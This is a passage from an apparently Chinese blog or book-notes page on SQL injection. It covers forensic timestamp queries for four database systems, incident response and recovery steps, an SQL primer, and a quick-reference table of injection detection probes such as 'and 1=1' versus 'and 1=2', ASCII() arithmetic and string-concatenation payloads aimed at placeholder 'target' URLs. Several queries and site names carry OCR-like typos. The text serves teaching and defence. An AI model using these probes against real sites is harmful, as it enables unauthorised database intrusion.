PostgreSQL的事务日志之后，也可以再将其禁用。</p>\n</li>\n</ul>\n<h5 id=\"数据库对象的时间戳\"><a href=\"#数据库对象的时间戳\" class=\"headerlink\" title=\"数据库对象的时间戳\"></a>数据库对象的时间戳</h5><p>在调查取证期间，生成关键对象和相应时间戳的列表是个好办法，这可以在可疑攻击时间段内标识对象的创建和修改活动。在调查可疑的SQL注入攻击时，请注意下列常常与攻击有关的活动：</p>\n<ul>\n<li><p>创建用户账号，这通常用于创建访问的后门。</p>\n</li>\n<li><p>为已有账号增加权限，这通常是执行权限提升的一部分操作。 </p>\n</li>\n<li><p>创建表，新创建的表通常用于在将信息返回给攻击者之前，存储中间结果。</p>\n</li>\n</ul>\n<h6 id=\"SQL-Server-4\"><a href=\"#SQL-Server-4\" class=\"headerlink\" title=\"SQL Server\"></a>SQL Server</h6><p>下面的查询将返回当前数据库中视图、过程、函数、表和扩展过程的一个列表，并按照修改日期和创建日期以降序方式排序：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> sob<span class=\"token punctuation\">.</span>name <span class=\"token keyword\">as</span> <span class=\"token string\">'object'</span><span class=\"token punctuation\">,</span> sch<span class=\"token punctuation\">.</span>name <span class=\"token keyword\">as</span> <span class=\"token string\">'schema'</span><span class=\"token punctuation\">,</span> type_desc<span class=\"token punctuation\">,</span> create_date<span class=\"token punctuation\">,</span> modify_date <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span>all_objects sob<span class=\"token punctuation\">,</span> sys<span class=\"token punctuation\">.</span>schemas sch <span class=\"token keyword\">WHERE</span> sob<span class=\"token punctuation\">.</span>schema_id <span class=\"token operator\">=</span> sch<span class=\"token punctuation\">.</span>schema_id <span class=\"token operator\">and</span> sob<span class=\"token punctuation\">.</span><span class=\"token keyword\">type</span> <span class=\"token operator\">IN</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'V'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'P'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'FN'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'U'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'S'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'IT'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'X'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">UNION</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> name<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Db_User'</span><span class=\"token punctuation\">,</span> createdate<span class=\"token punctuation\">,</span> updatedate <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span>sysusers<span class=\"token punctuation\">)</span> <span class=\"token keyword\">UNION</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> name<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Login'</span><span class=\"token punctuation\">,</span> createdate<span class=\"token punctuation\">,</span> updatedate <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span>syslogins<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"Oracle-8\"><a href=\"#Oracle-8\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h6><p>在Oracle中，可以使用下面的查询返回当前数据库中数据库对象类型的一个列表，比如表、视图和过程，并按照修改日期和创建日期以降序方式排序：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">Select</span> object_name<span class=\"token punctuation\">,</span> object_id<span class=\"token punctuation\">,</span> object_type<span class=\"token punctuation\">,</span> created<span class=\"token punctuation\">,</span> last_DDL_time <span class=\"token keyword\">from</span> dba_objects <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> LAST_DDL_time <span class=\"token keyword\">DESC</span><span class=\"token punctuation\">,</span> created <span class=\"token keyword\">DESC</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h6 id=\"MySQL-3\"><a href=\"#MySQL-3\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h6><p>当使用MySQL数据库时，应该注意对于某些对象比如触发器和视图并不存储时间戳。运行下面的查询，没有时间戳的对象将返回NULL值作为时间戳列的值</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span>\n<span class=\"token punctuation\">(</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> TABLE_NAME <span class=\"token keyword\">as</span> <span class=\"token string\">\"OBJECT\"</span><span class=\"token punctuation\">,</span> TABLE_SCHEMA <span class=\"token keyword\">as</span> <span class=\"token string\">\"OBJECT_SCHEMA\"</span><span class=\"token punctuation\">,</span>\nTABLE_TYPE <span class=\"token keyword\">as</span> <span class=\"token string\">\"OBJECT_TYPE\"</span><span class=\"token punctuation\">,</span> CREATE_TIME<span class=\"token punctuation\">,</span> UPDATE_TIME <span class=\"token keyword\">from</span>\ninformation_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">UNION</span> \n<span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> SPECIFIC_NAME<span class=\"token punctuation\">,</span> ROUTINE_SCHEMA<span class=\"token punctuation\">,</span> ROUTINE_TYPEZ CREATED<span class=\"token punctuation\">,</span> LAST_ALTERED <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span>routines <span class=\"token keyword\">WHERE</span> ROUTINE_TYPE <span class=\"token operator\">=</span><span class=\"token string\">'PROCEDURE'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">UNION</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">User</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">'DB_USER'</span><span class=\"token punctuation\">,</span>\t<span class=\"token string\">''</span><span class=\"token punctuation\">,</span>\t<span class=\"token string\">''</span> <span class=\"token keyword\">from</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"PostgreSQL-6\"><a href=\"#PostgreSQL-6\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h6><p>对于创建的对象、表和用户等，PostgreSQL并不记录它们的时间戳信息。可以使用下面的查询，返回当前数据库中关键对象的名称、模式和类型。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> proname <span class=\"token keyword\">as</span> <span class=\"token string\">\"OBJECT_NAME\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span> <span class=\"token keyword\">as</span> <span class=\"token string\">\"OBJECT_SCHEMA\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">'PROCEDURE'</span> <span class=\"token keyword\">as</span>\n<span class=\"token string\">\"OBJECT_TYPE\"</span> <span class=\"token keyword\">from</span> pg_proc <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">ALL</span> <span class=\"token keyword\">select</span> tgname<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'TRIGGER'</span> <span class=\"token keyword\">from</span> pg_trigger\n<span class=\"token keyword\">UNION</span> <span class=\"token keyword\">ALL</span> <span class=\"token keyword\">select</span> tablename<span class=\"token punctuation\">,</span> schemaname<span class=\"token punctuation\">,</span> <span class=\"token string\">'TABLE'</span> <span class=\"token keyword\">from</span> pg_tables <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">ALL</span> <span class=\"token keyword\">select</span> usename<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'USER'</span> <span class=\"token keyword\">from</span> pg_user  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"如果你是受害者，该怎么办？\"><a href=\"#如果你是受害者，该怎么办？\" class=\"headerlink\" title=\"如果你是受害者，该怎么办？\"></a>如果你是受害者，该怎么办？</h3><h4 id=\"遏制安全事件\"><a href=\"#遏制安全事件\" class=\"headerlink\" title=\"遏制安全事件\"></a>遏制安全事件</h4><p>要遏制SQL注入攻击事件，可以简单地拔除受损害服务器的网线。</p>\n<h4 id=\"评估涉及的数据\"><a href=\"#评估涉及的数据\" class=\"headerlink\" title=\"评估涉及的数据\"></a>评估涉及的数据</h4><ul>\n<li><p>涉及信息的类型。</p>\n</li>\n<li><p>涉及的信息是否可辨识为个人信息还是组织机构的信息。</p>\n</li>\n<li><p>影响到哪些国家、州或省的人。</p>\n</li>\n<li><p>对数据执行了什么操作（更新、删除、修改或泄漏）。</p>\n</li>\n<li><p>重用未授权数据的影响。</p>\n</li>\n<li><p>任何缓解措施，比如数据加密，这可以降低未经授权的人重用这些信息的可能性。</p>\n</li>\n</ul>\n<h4 id=\"通知相关人员\"><a href=\"#通知相关人员\" class=\"headerlink\" title=\"通知相关人员\"></a>通知相关人员</h4><p>要求委托管理个人信息的组织机构在数据安全遭受破坏时通知受影响的人员。</p>\n<h4 id=\"确定攻击者在系统上执行了哪些操作？\"><a href=\"#确定攻击者在系统上执行了哪些操作？\" class=\"headerlink\" title=\"确定攻击者在系统上执行了哪些操作？\"></a>确定攻击者在系统上执行了哪些操作？</h4><ul>\n<li><p>标识出攻击者查看到的信息。</p>\n</li>\n<li><p>识别出攻击者执行的DML和DDL操作，以及受影响的特定记录。</p>\n</li>\n<li><p>标识出事务之前和事务之后受影响的数据状态，以支持恢复数据库。</p>\n</li>\n<li><p>恢复之前己经被删除的数据。</p>\n</li>\n</ul>\n<p>数据库取证资源</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">RDBMS</th>\n<th>图   书</th>\n<th>专注于信息取证的Web网站</th>\n<th>工   具</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Microsoft  SQL  Server</td>\n<td>SQL Server Forensic Analysis，Addison  Wesley Professional</td>\n<td><a href=\"http://www.applicationfdrensics.com/\">www.applicationfdrensics.com</a></td>\n<td>Windows Forensic Toolchest  (SQL)</td>\n</tr>\n<tr>\n<td align=\"center\">Oracle</td>\n<td>Oracle Forensics，  Rampant  Press</td>\n<td><a href=\"http://www.red-databasesecurity.com/\">www.red-databasesecurity.com</a>  <br><a href=\"http://www.v3rity.com/\">www.v3rity.com</a><br><a href=\"http://www.applicationfbrensics.com/\">www.applicationfbrensics.com</a></td>\n<td>McAfee Security Scanner for  Databases</td>\n</tr>\n<tr>\n<td align=\"center\">MySQL</td>\n<td>无</td>\n<td><a href=\"http://www.applicationfbrensics.com/\">www.applicationfbrensics.com</a></td>\n<td>无</td>\n</tr>\n<tr>\n<td align=\"center\">PostgreSQL</td>\n<td>无</td>\n<td><a href=\"http://www.applicationfbrensics.com/\">www.applicationfbrensics.com</a></td>\n<td>无</td>\n</tr>\n</tbody></table>\n<h4 id=\"从SQL注入攻击中恢复\"><a href=\"#从SQL注入攻击中恢复\" class=\"headerlink\" title=\"从SQL注入攻击中恢复\"></a>从SQL注入攻击中恢复</h4><p>静态有效载荷：从一个受损害系统到另外一个受损害系统，在后损害(post-compromise)系统上执行的活动是一致的。</p>\n<p>动态有效载荷：从一个受损害系统到另外一个受损害系统，在后损害(post-compromise)系统上执行的活动是不一致的。</p>\n<h5 id=\"确定攻击携带的有效载荷\"><a href=\"#确定攻击携带的有效载荷\" class=\"headerlink\" title=\"确定攻击携带的有效载荷\"></a>确定攻击携带的有效载荷</h5><p>执行下面的步骤，以识别成功SQL注入攻击的有效载荷：</p>\n<ol>\n<li><p>备份受损害数据库：为受损害数据库制作两份副本。一份用于恢复数据，另一份则作为干净的恢复点，以备在恢复出现问题时使用。</p>\n</li>\n<li><p>提取恶意的SQL注入查询，从受损害的Web服务器日志、数据库执行计划，包括从MySQL和PostgreSQL数据库服务器的statement log和binary logs中提取恶意查询和语句的唯一清单。</p>\n</li>\n<li><p>理解恶意查询的逻辑：检查列出的恶意查询和语句，确定它们所创建、访问、更新或删除的对象，以及攻击者如何实现这些操作。我们需要这些信息来确定安全事件影响的范围， 从而规划出恢复安全事件的步骤。</p>\n</li>\n<li><p>搜索恶意查询参考：我们可能己经具有己知恶意语句和命令的列表，可以使用该列表与之前提取的恶意查询清单相互比对，以识别恶意查询的来源。</p>\n</li>\n<li><p>确定恶意查询是静态有效载荷还是动态有效载荷的一部分：从搜索结果中可以确定， 攻击是与诸如SQL注入蠕虫这样的静态有效载荷有关，还是与攻击者使用SQL注入漏洞利用工具、投送传统即席查询(ad-hoc)的动态有效载荷有关。</p>\n</li>\n<li><p>查找多种漏洞：在恶意查询清单中检查所有的条目，因为同一 SQL注入漏洞可能会被多次利用，既可能使用静态有效载荷也可能通过动态有效载荷。</p>\n</li>\n</ol>\n<h5 id=\"从携带静态有效载荷的攻击中恢复\"><a href=\"#从携带静态有效载荷的攻击中恢复\" class=\"headerlink\" title=\"从携带静态有效载荷的攻击中恢复\"></a>从携带静态有效载荷的攻击中恢复</h5><p>恢复的核心问题，是将数据库回滚到受攻击影响之前的状态，或者识别并取消 (undo)那些恶意查询和语句所执行的具体操作。</p>\n<p>从携带静态有效载荷的攻击中进行恢复的步骤：</p>\n<ol>\n<li><p>恢复数据库状态</p>\n<ul>\n<li>从备份中恢复</li>\n<li>标识要回滚的事务</li>\n</ul>\n</li>\n<li><p>检验数据库服务器配置：如果静态有效载荷带有频繁针对RDBMS特性的攻击，或者解除服务器的安全配置以实现进一步的攻击，那么应该将数据库服务器的配置恢复到已知的良好状态。</p>\n</li>\n<li><p>识别并修复SQL注入漏洞：确保对整个代码库进行一次应用程序安全评估，以识别可被利用的漏洞和其他可能存在的情况。</p>\n</li>\n<li><p>在线恢复系统并恢复Web服务。</p>\n</li>\n</ol>\n<h5 id=\"从携带动态有效载荷的攻击中恢复\"><a href=\"#从携带动态有效载荷的攻击中恢复\" class=\"headerlink\" title=\"从携带动态有效载荷的攻击中恢复\"></a>从携带动态有效载荷的攻击中恢复</h5><p>对于携带动态有效载荷的成功攻击，强烈建议聘请数据库取证专家进行调查取证。</p>\n<p>可以遵循下列步骤：</p>\n<ol>\n<li><p>恢复数据库状态：对于动态有效载荷的SQL注入攻击，建议将RDBMS和操作系统都恢复到受损害之前的状态。</p>\n</li>\n<li><p>识别脱离数据库的活动：在之前收集好的恶意查询清单中，应该标识出那些允许攻击者脱离数据库服务器、进入底层操作系统的文件系统或注册表的语句。如果发现针对操作系统的活动，就应该执行下列操作：</p>\n<ul>\n<li>查找创建了带外通信的任何方法</li>\n<li>查找对操作系统文件的引用，或者攻击者读取、创建或加载到数据库中的注册表键值 (key)。</li>\n</ul>\n</li>\n<li><p>检验数据库服务器的配置：一旦攻击者获得对数据库服务器的访问之后，他就会解除存在的安全设置，以便进一步在服务器上实施攻击。</p>\n</li>\n<li><p>识别并修复SQL注入漏洞：确保对整个代码库进行一次应用程序安全评估，以识别可被利用的漏洞和其他可能存在的情况。</p>\n</li>\n<li><p>在线恢复系统并恢复Web服务。</p>\n</li>\n</ol>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><h3 id=\"SQL入门\"><a href=\"#SQL入门\" class=\"headerlink\" title=\"SQL入门\"></a>SQL入门</h3><h4 id=\"SQL查询\"><a href=\"#SQL查询\" class=\"headerlink\" title=\"SQL查询\"></a>SQL查询</h4><ol>\n<li>SELEC丁语句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> tblUsers\n<span class=\"token keyword\">SELECT</span> username <span class=\"token keyword\">FROM</span> tblUsers\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> tblUsers <span class=\"token keyword\">WHERE</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'admin'</span> <span class=\"token operator\">AND</span> password <span class=\"token operator\">=</span> <span class=\"token string\">'letmein'</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">INTO</span> hackerTable <span class=\"token keyword\">FROM</span> tblUsers<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol start=\"2\">\n<li>UNION运算符</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> tblUsers <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> tblAdmins\n<span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> tblUsers <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">ALL</span> <span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> tblAdmins<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ol start=\"3\">\n<li>INSERT 语句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> tblUsers <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token string\">'john'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'smith'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> tblUsers<span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">,</span> priv<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'john'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'smith'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ol start=\"4\">\n<li>UPDATE 语句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">UPDATE</span> tblUsers <span class=\"token keyword\">SET</span> priv<span class=\"token operator\">=</span><span class=\"token number\">0</span> <span class=\"token keyword\">WHERE</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'sarah'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol start=\"5\">\n<li>DELETE 语句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">FROM</span> tblUsers <span class=\"token keyword\">WHERE</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'admin'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol start=\"6\">\n<li>DROP语句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">TABLE</span> tblUsers<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol start=\"7\">\n<li>CREATE TABLE 语句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> shoppinglist<span class=\"token punctuation\">(</span>item <span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> name <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> shoppinglist <span class=\"token keyword\">as</span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> dba_users<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ol start=\"8\">\n<li>ALTER TABLE 语句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> tblUsers <span class=\"token keyword\">ADD</span> comments <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> tblUsers <span class=\"token keyword\">DROP</span> <span class=\"token keyword\">COLUMN</span> comments\n<span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> tblUsers <span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">COLUMN</span> comments <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ol start=\"9\">\n<li>GROUP BY语句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> customer<span class=\"token punctuation\">,</span> <span class=\"token function\">SUM</span><span class=\"token punctuation\">(</span>cost<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> orders <span class=\"token keyword\">WHERE</span> customer <span class=\"token operator\">=</span> <span class=\"token string\">'Anthony Anteater'</span> <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> customer<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol start=\"10\">\n<li>ORDER BY 子句</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> cost<span class=\"token punctuation\">,</span>product <span class=\"token keyword\">FROM</span> orders <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token keyword\">DESC</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol start=\"11\">\n<li>限制结果集</li>\n</ol>\n<h3 id=\"SQL注入快速参考\"><a href=\"#SQL注入快速参考\" class=\"headerlink\" title=\"SQL注入快速参考\"></a>SQL注入快速参考</h3><h4 id=\"识别SQL注入漏洞\"><a href=\"#识别SQL注入漏洞\" class=\"headerlink\" title=\"识别SQL注入漏洞\"></a>识别SQL注入漏洞</h4><p>发现SQL注入缺陷</p>\n<table>\n<thead>\n<tr>\n<th>方   法</th>\n<th>描   述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>异常的输入是否会产生数据库 错误？</td>\n<td>输入SQL元字符或异常、错误的数据类型，有可能产生数据库错误。常见的测试用例包括在字符串字段中输入单引号(‘)字符，或者在数值字段中输入随机的字符串。通常可以通过HTTP状态代码500，或者页面中描述性的错误消息来识别这种数据库错误。提交异常数据并分析服务器响应中的下列字符串，有助于识别SQL注入漏洞：<br><code>Microsoft OLE DB Provider  ORA-  PLS-  error in your SQL Syntax  80040E14  SQL Error  Incorrect Syntax near  SQLServer  Failed MySQL  Unclosed Quotation Mark  JDBC Driver  ODBC Driver  SQL  ODBC  </code></td>\n</tr>\n<tr>\n<td>合法、正确的输入是否可以替换 等效的SQL表达式？</td>\n<td>如果遇到了错误，修改输入的数据以分析错误，确定输入的数据是否导致了SQL语法错误。例如，双倍使用单引号字符——如果一个引号导致了错误，而两个引号没有产生错误，那么很有可能存在未发现的SQL注入缺陷。请注意，由错误数据类型导致的错误可以是预期的并具有正常的表现。 例如，如果在需要数值的地方提供了字符串数据，那么很多应用程序将 产生错误。这时应该进一步采用其他技术来确认是否存在SQL注入漏洞。 在采用这种检测技术之前，判断所测试的输入对于服务器的响应是否有影响是很重要的。例如，如果提供了一个数值，那么尝试使用另一个不同的数值并确定是否产生了可度量且一致的差异。对于字符串值， 使用同一字符集，并将字符串值修改为一个相同长度的随机字符串， 然后观察应用程序的响应。如果对数据的修改并没有对页面长度、内容或HTTP响应代码产生一致的差别，那么该技术不太可能成功。</td>\n</tr>\n<tr>\n<td>合法、正确的输入是否可以替换 等效的SQL表达式？</td>\n<td>数值数据在这个例子中，我们将假定测试一个传递给news.php脚本的数值类型的ID参数。下面两个请求产生了不同的响应，因此可以认为ID参数是动态的，并且可以用于这种测试方法。<br><a href=\"http://target/news.php?ID=1\">http://target/news.php?ID=1</a><br><a href=\"http://target/news.php?ID=2\">http://target/news.php?ID=2</a> <br>在测试过程中，下一个步骤是提交一个SQL表达式，该表达式将被计算为事先确定好的正确值（比如上面例子中的1和2）。然后将对每一个表达式的响应与初始测试时的响应进行比较，以确定是否对该表达式  进行了计算。在这种类型的测试中，常用的SQL函数是ASCII(),对于所提供的ASCII字符，该函数将返回一个整数。因此，下面的SQL表达式应该返回值1( “2”的ASCT编码值是50)<br>51-ASCII(2) <br>如果我们的输入被SQL Server以不安全的方式解析，那么下列请求应该等价于原始的请求：<br><a href=\"http://target/news.php?ID=51-ASCII(2)\">http://target/news.php?ID=51-ASCII(2)</a><br>– 等价手ID=1 <br><a href=\"http://target/news.php?ID=52-ASCII(2)\">http://target/news.php?ID=52-ASCII(2)</a><br>– 等价手ID=2 <br>绝大多数主流数据库平台都支持ASCII()函数，包括Microsoft SQL  Server、Oracle、MySQL 和 PostgreSQL。 请使用类似的算术表达式来确认结果。字符串数据 当处理字符串数据时，可以采用与评估数值参数类似的方法。与前面的例子一样，第一步是从应用程序获取有效的值，并确定当改变该值时服务器的响应也一致地产生差异。在本例中，我们假定下面的请求参数值将产生不同的结果：<br><a href=\"http://target/products.asp?catagory=shoes\">http://target/products.asp?catagory=shoes</a><br><a href=\"http://target/products.asp?catagory=blahfoo\">http://target/products.asp?catagory=blahfoo</a><br>在测试字符串数据时，一种常用的策略是将字符串拆分为两个或多个子串，然后再使用SQL语法在服务器端将这些子串连接起来。一个重要的附加说明是：对于字符串的连接，需要根据数据库平台的不同采用不同的连接语法。由于我们可能事先知道是哪一种数据库服务器， 因此典型的办法是一开始就使用目标平台的字符串连接语法，比如  Microsoft SQL Server、Oracle 或 MySQL。下列 URL 实现了再造参数值”shoes”的字符串连接： <br>Microsoft  SQL Server  <a href=\"http://target/products.asp?catagory=sho%27+%27es(+%E6%98%AF+%E5%8F%B7%E7%9A%84URL%E7%BC%96%E7%A0%81)\">http://target/products.asp?catagory=sho'%2b'es(%2b是+号的URL编码)</a><br>Oracle 或 PostgreSQL  <a href=\"http://target/products.asp?catagory=sho%27%7C%7C%27es\">http://target/products.asp?catagory=sho'||'es</a> <br>MySQL  <a href=\"http://target/products.asp?catagory=sho%27%20%27es\">http://target/products.asp?catagory=sho'%20'es</a>  (%20是空格字符的URL编码)改变连接操作符两侧的子串将使输入无效，并取回与其他任意随机字符串一致的结果。</td>\n</tr>\n<tr>\n<td>在服务器的响应中，SQL条件表达式的附加部分是否产生一致 的差异性？</td>\n<td>从统计角度讲，大多数SQL注入漏洞都发生在这样的情况下：当用户提供的数据被不安全地包含在操作数中，并被传递给WHERE子句时。 在下面的例子中，请注意URL和产生的SQL査询：  <br>URL: <a href=\"http://targetserver/news.php?id=100\">http://targetserver/news.php?id=100</a>  <br>SQL: SELECT * FROM news WHERE article_id=100 <br>在正常的操作下，上面这个例子将取回并显示article_id值等于100的新闻文章。但是，如果参数id容易受到SQL注入&amp;击，那么下面的请求将产生不同的结果：<br>URL 1: <a href=\"http://targetserver/news.php?id=100\">http://targetserver/news.php?id=100</a> and 1=1  URL 2: <a href=\"http://targetserver/news.php?id=100\">http://targetserver/news.php?id=100</a> and 1=2  <br>通过添加”and 1=1”，在页面上应该看不到改变，因为从逻辑上来讲，该表达式并未改变WHERE子句的输出： <br> SELECT * FROM news WHERE article_id=100 and 1=1 相反，添加”and 1=2”意味着WHERE子句并不匹配数据库中的任何记录：<br>SELECT * FROM news WHERE article_id=100 and 1=2 通过使用这种技术操纵服务器的响应，我们常常可以识别SQL注入漏洞的存在。在某些情况下，可能需要通过关闭圆括号或者打破引号界定的数据，以便使用这种技术。例如，可以使用下面一系列的表达式：  <br>‘AND  ‘a’=’a Vs    ‘AND ‘a’=’b’  AND  1=1-Vs     ‘AND 1=2–  ) AND 1=1– Vs    ) AND 1=1–  ‘) AND 1=1-Vs     ‘) AND 1=2–</td>\n</tr>\n<tr>\n<td>是否有可能触发可度量的时间 延迟？</td>\n<td>通过SQL注入触发可度量的时间延迟，既可以用来确认是否存在缺陷， 在绝大多数情况下也可以用来识别后台数据库。</td>\n</tr>\n</tbody></table>\n<h4 id=\"识别数据库平台\"><a href=\"#识别数据库平台\" class=\"headerlink\" 